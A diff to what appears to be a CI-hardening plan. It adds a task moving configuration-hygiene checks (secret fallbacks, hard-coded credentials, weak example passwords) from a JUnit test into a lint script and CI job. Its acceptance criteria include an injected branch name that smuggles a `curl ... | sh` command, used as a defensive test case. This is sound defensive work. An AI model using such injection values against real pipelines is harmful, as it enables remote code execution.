@@ -71,9 +71,24 @@ reports.
       `guardrail-change`: a PR cannot quietly weaken the rules it is judged by. CODEOWNERS
       review was rejected — with a single maintainer, GitHub refuses self-approval and every
       such PR would deadlock.
+- [ ] **Configuration lint out of JUnit.** `ConfigurationHygieneTest` reads repository
+      files, not application code: it is a lint that runs in the test suite only because no
+      CI existed. Its four rules move to one script, `scripts/lint-config.sh`, called by a
+      required CI job **and** by a pre-commit hook — the hook for early feedback, the CI job
+      as the gate, since a hook can be skipped:
+      - no secret declares a fallback in `application*.yaml` (`${VAR:default}`);
+      - no credential is hard-coded in the Compose files or the configuration;
+      - every `${VAR}` referenced is listed in `.env.example`;
+      - every example password or secret is exactly the command that generates it, in angle
+        brackets — `<openssl rand -hex 16>`, `<openssl rand -base64 48>` — and nothing else.
+      Then `ConfigurationHygieneTest` is deleted, with the `inputs.files(...)` block of
+      `build.gradle` that only exists so Gradle reruns it when those files change. **Only once
+      the CI job is required**: removing the test before would leave no gate at all.
 
 *Done when* throwaway PRs with a bad branch name, a wrong base, a commit without a type, and
 an injected branch name (`feature/a";curl${IFS}x|sh;#`) are each refused, and nothing runs.
+A throwaway PR that sets `POSTGRES_PASSWORD=postgres` in `.env.example`, or a secret fallback in
+`application.yaml`, is refused by the configuration lint.
 
 ### 2. API pipeline — `.github/workflows/api-ci.yml`
 
